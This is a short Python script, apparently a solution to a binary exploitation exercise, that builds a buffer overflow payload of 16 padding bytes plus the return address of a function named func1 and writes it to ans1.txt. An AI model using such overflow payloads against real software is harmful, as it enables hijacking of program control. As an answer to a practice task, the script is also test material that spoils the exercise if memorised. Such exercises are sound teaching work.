offset = 16

func1_address = 0x401216
func1_bytes = func1_address.to_bytes(8, 'little')

padding = b'A' * offset
payload = padding + func1_bytes

with open("ans1.txt", "wb") as f:
    f.write(payload)